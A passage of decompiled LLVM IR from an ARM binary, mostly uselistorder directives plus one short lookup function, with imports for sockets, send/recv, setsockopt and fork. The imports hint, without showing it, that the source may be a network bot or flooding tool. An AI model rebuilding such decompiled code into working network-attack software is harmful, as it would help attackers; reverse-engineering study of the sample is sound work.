  uselistorder i32* %r1.global-to-local, { 9, 10, 11, 12, 35, 36, 96, 97, 13, 14, 15, 92, 93, 98, 99, 0, 1, 2, 3, 4, 5, 6, 7, 8, 100, 89, 90, 16, 17, 18, 19, 20, 21, 22, 23, 94, 95, 101, 102, 59, 37, 38, 39, 40, 24, 25, 26, 27, 41, 42, 43, 45, 46, 44, 47, 48, 50, 49, 88, 28, 29, 30, 31, 32, 33, 34, 51, 52, 53, 54, 55, 56, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 91, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87 }
  uselistorder i32* %r0.global-to-local, { 31, 32, 34, 33, 35, 37, 36, 38, 39, 41, 40, 202, 203, 204, 102, 101, 42, 104, 103, 194, 196, 195, 106, 108, 109, 105, 110, 107, 44, 43, 45, 47, 46, 48, 50, 49, 51, 177, 176, 125, 178, 179, 180, 198, 197, 199, 2, 1, 3, 5, 4, 7, 6, 8, 9, 10, 11, 13, 12, 15, 14, 17, 16, 18, 19, 20, 21, 23, 22, 25, 24, 27, 26, 28, 29, 30, 206, 205, 53, 54, 56, 55, 57, 52, 58, 59, 60, 61, 63, 62, 65, 64, 67, 66, 68, 69, 70, 72, 71, 73, 75, 74, 77, 76, 78, 79, 80, 182, 181, 184, 183, 188, 185, 186, 187, 208, 207, 210, 209, 190, 189, 191, 192, 193, 201, 200, 113, 111, 82, 81, 83, 85, 84, 87, 86, 88, 89, 90, 119, 112, 114, 115, 116, 118, 117, 120, 123, 121, 122, 129, 124, 128, 126, 127, 130, 92, 91, 93, 94, 95, 97, 96, 98, 99, 100, 133, 131, 132, 135, 134, 136, 138, 137, 175, 139, 140, 141, 0, 142, 143, 145, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 163, 162, 165, 164, 166, 170, 169, 167, 168, 171, 172, 173, 174 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 22, 7, 8, 9, 10, 11, 19, 20, 21, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ip.global-to-local, { 13, 14, 6, 15, 7, 42, 0, 2, 1, 4, 3, 5, 47, 8, 9, 10, 11, 12, 41, 46, 48, 43, 44, 45, 16, 17, 18, 19, 20, 21, 24, 22, 23, 25, 49, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_z.global-to-local, { 27, 28, 70, 227, 177, 56, 61, 60, 62, 63, 64, 29, 168, 31, 32, 33, 178, 179, 180, 197, 198, 199, 200, 201, 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 15, 16, 11, 12, 13, 14, 17, 18, 19, 24, 25, 20, 21, 22, 23, 26, 216, 34, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 181, 182, 186, 187, 183, 184, 185, 188, 218, 189, 194, 195, 190, 191, 192, 193, 196, 217, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 226, 169, 65, 66, 67, 68, 69, 170, 55, 30, 57, 58, 59, 71, 73, 72, 74, 75, 77, 79, 78, 171, 76, 80, 81, 82, 83, 84, 85, 90, 86, 87, 88, 89, 174, 175, 172, 173, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 225, 123, 124, 224, 125, 126, 223, 127, 128, 222, 129, 130, 131, 167, 132, 221, 133, 134, 220, 135, 136, 219, 137, 138, 139, 140, 141, 166, 142, 143, 144, 145, 146, 165, 147, 148, 149, 164, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 176, 163 }
  uselistorder i1* %cpsr_c.global-to-local, { 27, 28, 29, 70, 223, 176, 56, 61, 60, 62, 63, 64, 30, 167, 31, 32, 33, 34, 177, 178, 179, 196, 197, 198, 199, 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 15, 16, 11, 12, 13, 14, 17, 18, 19, 24, 25, 20, 21, 22, 23, 26, 212, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 180, 181, 185, 186, 182, 183, 184, 187, 214, 188, 193, 194, 189, 190, 191, 192, 195, 213, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 222, 168, 65, 66, 67, 68, 69, 169, 55, 166, 57, 58, 59, 71, 73, 72, 74, 76, 78, 77, 170, 75, 79, 80, 81, 82, 83, 88, 84, 85, 86, 87, 173, 174, 171, 89, 172, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 221, 117, 118, 220, 119, 120, 219, 121, 122, 218, 123, 124, 125, 165, 126, 217, 127, 128, 216, 129, 130, 215, 131, 132, 133, 134, 135, 164, 136, 137, 138, 139, 140, 163, 141, 142, 143, 162, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 175, 161 }
  uselistorder i32 (i8*)* @inet_addr, { 2, 1, 0, 3, 4 }
  uselistorder [15 x i8]* @global_var_1202c.134, { 1, 0 }
  uselistorder i8 31, { 8, 2, 3, 9, 10, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* (i32*, i32*, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_120c8.257 to i32*), { 2, 4, 3, 1, 0, 6, 5 }
  uselistorder [3 x i8]* @global_var_120c8.257, { 1, 0 }
  uselistorder i8 58, { 4, 6, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 62, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 37, { 3, 5, 4, 2, 1, 0 }
  uselistorder i8 34, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 36, { 7, 8, 11, 12, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 8, 9, 12, 13, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @recv, { 0, 5, 3, 2, 1, 4, 6 }
  uselistorder i32 (i32)* @function_11294, { 35, 10, 9, 34, 14, 38, 37, 36, 33, 32, 31, 13, 12, 11, 30, 29, 15, 28, 27, 26, 39, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1185c, { 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32*)* @function_11268, { 3, 4, 32, 0, 1, 2, 5, 6, 7, 8, 9, 31, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 33, 24, 25, 26, 27, 28, 29, 30, 36, 34, 35 }
  uselistorder i32 (i32)* @function_1134c, { 27, 26, 3, 30, 29, 28, 25, 24, 23, 22, 21, 4, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_1a418.188 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1a419.189, { 4, 3, 2, 1, 0 }
  uselistorder i32 284, { 3, 4, 5, 0, 1, 2, 6, 7 }
  uselistorder i32* @r7, { 11, 12, 13, 17, 18, 19, 4, 8, 9, 10, 26, 14, 15, 16, 6, 20, 5, 21, 22, 23, 24, 25, 27, 3, 28, 29, 30, 166, 167, 168, 115, 116, 117, 118, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 7, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 92, 88, 89, 90, 91, 1, 93, 94, 95, 96, 97, 98, 103, 99, 100, 101, 102, 2, 104, 105, 106, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 169, 170, 171, 172, 173, 174, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32 1536, { 1, 0 }
  uselistorder i32 1664, { 2, 0, 1 }
  uselistorder void (i32)* @exit, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32* @r6, { 19, 20, 21, 50, 59, 60, 61, 62, 63, 64, 41, 22, 23, 65, 46, 66, 67, 68, 69, 70, 71, 24, 25, 26, 27, 28, 42, 47, 10, 11, 12, 13, 14, 15, 16, 17, 18, 51, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 52, 53, 54, 55, 48, 49, 72, 73, 74, 75, 76, 56, 57, 77, 78, 7, 79, 80, 81, 82, 58, 275, 276, 277, 201, 202, 203, 204, 0, 83, 84, 85, 86, 87, 88, 89, 90, 91, 2, 92, 93, 94, 95, 96, 8, 97, 98, 99, 100, 101, 102, 103, 1, 104, 105, 106, 3, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 205, 4, 206, 5, 207, 6, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 278, 279, 280, 281, 282, 283, 284, 285, 286, 190, 193, 191, 192, 194, 195, 9, 196, 197, 198, 199, 200 }
  uselistorder i32 (i32, i32*, i32, i32)* @send, { 9, 30, 21, 16, 14, 0, 3, 4, 5, 6, 7, 11, 10, 13, 12, 8, 28, 27, 26, 17, 19, 29, 15, 23, 18, 20, 22, 2, 1, 25, 24, 31 }
  uselistorder i32 ()* @function_f8e0, { 3, 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32*)* @recvfrom, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32)* @sendto, { 8, 7, 5, 0, 9, 1, 3, 6, 4, 2, 10 }
  uselistorder i32 16384, { 13, 61, 12, 49, 0, 50, 1, 51, 2, 52, 3, 53, 4, 54, 5, 55, 6, 56, 7, 57, 8, 58, 29, 59, 30, 60, 27, 63, 28, 64, 25, 26, 62, 37, 72, 31, 65, 32, 66, 33, 67, 34, 68, 35, 69, 36, 70, 9, 71, 10, 73, 11, 74, 15, 75, 40, 76, 39, 77, 41, 78, 42, 79, 14, 80, 38, 81, 16, 82, 17, 83, 18, 84, 43, 85, 19, 86, 44, 87, 20, 88, 21, 89, 22, 90, 23, 91, 24, 92, 45, 46, 47, 48 }
  uselistorder i32 (i32, i32, i32, i32)* @function_de50, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_ddf4, { 11, 10, 9, 8, 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* @global_var_1a3fc.246, { 2, 1, 0 }
  uselistorder i32 16711680, { 3, 0, 1, 2 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 33, { 2, 0, 1 }
  uselistorder i32 28, { 5, 6, 7, 8, 9, 10, 11, 0, 4, 13, 12, 1, 2, 3, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 27, { 1, 7, 0, 6, 2, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 20, { 17, 18, 1, 19, 2, 20, 16, 21, 22, 23, 24, 25, 3, 26, 27, 28, 29, 30, 31, 32, 33, 4, 34, 35, 36, 0, 37, 38, 39, 40, 12, 41, 42, 43, 44, 45, 46, 47, 48, 49, 13, 50, 51, 52, 53, 54, 55, 56, 58, 59, 5, 60, 61, 62, 63, 64, 65, 66, 6, 67, 68, 69, 70, 14, 15, 71, 8, 72, 7, 73, 74, 75, 76, 10, 77, 9, 78, 79, 80, 81, 82, 83, 84, 85, 11, 86, 87, 88, 89, 90, 91, 92, 93, 94, 57 }
  uselistorder i32 22, { 4, 0, 5, 1, 6, 2, 7, 3 }
  uselistorder i32 -6, { 1, 0, 2, 3 }
  uselistorder i32 159, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 18, { 8, 0, 1, 2, 3, 9, 4, 10, 5, 11, 6, 12, 7, 13 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 31, { 10, 9, 13, 14, 11, 12, 7, 8, 3, 4, 0, 5, 1, 2, 6 }
  uselistorder i32 30, { 0, 6, 4, 5, 1, 2, 3 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32* @fp, { 2, 3, 44, 45, 46, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29, 30, 31, 1, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49, 50, 51 }
  uselistorder i32 13, { 22, 23, 24, 26, 25, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 16, 17, 18, 19, 27, 28, 29, 30, 31, 20, 32, 33, 34, 35, 36, 37, 38, 39, 21, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 2, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 3, 68, 69 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_120a8.240 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_120a0.238 to i32), { 0, 2, 1, 3 }
  uselistorder i32 11, { 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 19, 2, 20, 21, 22, 3, 23, 24, 25, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_12064.226 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_f9b4, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_120d0.218 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_120cc.216 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i8* @global_var_1a40d.212, { 1, 0 }
  uselistorder i8 64, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1a400.203 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8* @global_var_1a40c.204, { 1, 0 }
  uselistorder i32 40, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), { 0, 2, 1, 4, 5, 3, 6, 7, 8, 9 }
  uselistorder i32 1024, { 1, 0 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 65280, { 34, 1, 17, 0, 2, 3, 4, 35, 18, 5, 36, 24, 19, 20, 25, 26, 27, 37, 38, 39, 40, 6, 7, 28, 29, 30, 41, 42, 43, 44, 8, 9, 45, 10, 46, 31, 32, 47, 11, 48, 49, 21, 50, 51, 12, 52, 53, 22, 54, 55, 13, 56, 23, 33, 57, 58, 14, 59, 60, 15, 16 }
  uselistorder i32 ()* @function_f67c, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 5, 4, 3, 2, 1, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @setsockopt, { 0, 2, 1, 4, 8, 10, 3, 7, 5, 6, 9, 11 }
  uselistorder i32 2048, { 5, 0, 1, 2, 6, 3, 7, 8, 4, 9 }
  uselistorder i32 (i32, i32, ...)* @fcntl, { 8, 2, 7, 9, 1, 0, 6, 5, 4, 3, 11, 10, 12 }
  uselistorder i32* @global_var_1a440.197, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @r5, { 6, 7, 18, 19, 8, 9, 10, 11, 12, 13, 14, 20, 21, 15, 16, 22, 23, 24, 25, 26, 27, 28, 17, 29, 30, 31, 32, 2, 33, 207, 208, 209, 210, 211, 212, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 3, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 1, 67, 68, 69, 70, 71, 72, 4, 73, 74, 75, 76, 77, 78, 79, 80, 5, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 201, 202, 203, 204, 205, 206 }
  uselistorder i32* @global_var_1a43c.195, { 1, 2, 3, 4, 0 }
  uselistorder i32* (i32, i32)* @calloc, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 11, 14, 13, 18, 17, 16, 15, 29, 20, 28, 37, 36, 35, 34, 23, 19, 25, 27, 26, 31, 30, 33, 32, 39, 38, 22, 21, 24, 10, 9, 12, 40 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1a41c.182, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @time, { 1, 0, 3, 2, 6, 5, 4, 8, 7, 9 }
  uselistorder i32 (i32)* @function_f6d4, { 1, 0 }
  uselistorder i32* @global_var_1a420.104, { 4, 5, 1, 2, 3, 6, 7, 8, 9, 10, 0, 11, 15, 12, 13, 14 }
  uselistorder i32 ()* @function_11a50, { 2, 1, 0 }
  uselistorder i32 ()* @fork, { 5, 4, 2, 3, 6, 1, 0, 7 }
  uselistorder i32* @sl, { 2, 80, 81, 82, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 83, 84, 85, 86, 36, 37, 38, 39, 40, 41 }
  uselistorder i32* @sb, { 2, 3, 4, 0, 5, 6, 7, 8, 75, 76, 77, 9, 10, 11, 12, 13, 14, 17, 15, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 78, 79, 80, 81, 82, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* @r8, { 3, 91, 92, 93, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 1, 90, 94, 2, 95, 54, 55, 56, 57, 58 }
  uselistorder label %dec_label_pc_107c8.backedge.thread501, { 9, 2, 8, 4, 7, 3, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_107c8.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11190, { 1, 0 }
  uselistorder label %.thread241, { 1, 0 }
  uselistorder label %bb378, { 1, 0 }
  uselistorder label %dec_label_pc_110cc, { 1, 0 }
  uselistorder label %dec_label_pc_11098, { 1, 0 }
  uselistorder label %thread-pre-split100, { 1, 0 }
  uselistorder label %dec_label_pc_10fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ed4, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10e20, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10d6c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10d58, { 1, 0 }
  uselistorder label %dec_label_pc_10d00, { 4, 5, 1, 2, 3, 11, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_10c10, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10bfc, { 1, 0 }
  uselistorder label %dec_label_pc_10ae8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10ad4, { 1, 0 }
  uselistorder label %dec_label_pc_10a48, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10a34, { 1, 0 }
  uselistorder label %dec_label_pc_109c4, { 1, 0 }
  uselistorder label %dec_label_pc_109a8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10994, { 1, 0 }
  uselistorder label %dec_label_pc_10950, { 4, 1, 2, 3, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_10940, { 5, 2, 3, 4, 1, 0 }
  uselistorder label %.thread90, { 2, 0, 1 }
  uselistorder label %.thread88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108dc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10898, { 1, 0 }
  uselistorder label %dec_label_pc_10898.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1082c, { 1, 0 }
  uselistorder label %bb347, { 1, 0 }
  uselistorder label %dec_label_pc_107e0, { 1, 0 }
  uselistorder label %dec_label_pc_107d0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_107d0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_107c4.loopexit, { 2, 5, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10724, { 2, 0, 1 }
  uselistorder label %dec_label_pc_105fc, { 1, 7, 8, 4, 5, 0, 6, 2, 3 }
  uselistorder label %dec_label_pc_105d4, { 1, 0 }
  uselistorder label %bb339, { 1, 0 }
  uselistorder label %bb337, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_10424.dec_label_pc_10424_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1040c.dec_label_pc_1040c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10404, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_103fc, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10318, { 1, 0 }
  uselistorder label %dec_label_pc_101bc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_101b0, { 1, 0 }
  uselistorder label %.thread68, { 2, 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %bb320, { 1, 0 }
  uselistorder label %dec_label_pc_10020.thread, { 1, 0 }
  uselistorder label %dec_label_pc_10014.thread, { 1, 0 }
  uselistorder label %dec_label_pc_10008.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fff0, { 1, 0 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_ff94, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff70, { 1, 0 }
  uselistorder label %dec_label_pc_ff64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff1c, { 1, 0 }
  uselistorder label %bb300, { 1, 0 }
  uselistorder label %dec_label_pc_fec8, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_fc8c, { 1, 0 }
}

define i32 @function_11268(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11268:
  store i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32* @ip, align 4
  %v3_1126c = mul i32 %arg1, 8
  %v2_11270 = add i32 %v3_1126c, ptrtoint (i32* @global_var_1a44c.264 to i32)
  %v2_11274 = icmp eq i32* %arg2, null
  br i1 %v2_11274, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11268
  %v3_1128011 = inttoptr i32 %v2_11270 to i32*
  %v4_1128012 = load i32, i32* %v3_1128011, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_11268
  %v2_11278 = add i32 %v3_1126c, add (i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32 5)
  %v3_11278 = inttoptr i32 %v2_11278 to i8*
  %v4_11278 = load i8, i8* %v3_11278, align 1
  %v5_11278 = zext i8 %v4_11278 to i32
  %v2_1127c = add i32 %v3_1126c, add (i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32 4)
  %v3_1127c = inttoptr i32 %v2_1127c to i8*
  %v4_1127c = load i8, i8* %v3_1127c, align 4
  %v5_1127c = zext i8 %v4_1127c to i32
  %v3_11280 = inttoptr i32 %v2_11270 to i32*
  %v4_11280 = load i32, i32* %v3_11280, align 4
  %v5_11284 = mul nuw nsw i32 %v5_11278, 256
  %v6_11284 = or i32 %v5_1127c, %v5_11284
  store i32 %v6_11284, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_11280714 = phi i32 [ %v4_1128012, %.thread ], [ %v4_11280, %bb ]
  ret i32 %v4_11280714

; uselistorder directives
  uselistorder i32 %v2_11270, { 1, 0 }
  uselistorder i32 %v3_1126c, { 2, 1, 0 }
  uselistorder i32* null, { 4, 8, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 2, 6, 3, 7, 21, 22, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_11294(i32 %arg1) local_unnamed_addr {
dec_label_pc_11294:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11294 = mul i32 %arg1, 8
  %v3_11298 = load i32, i32* @r4, align 4
  store i32 %v3_11298, i32* %stack_var_-20, align 4
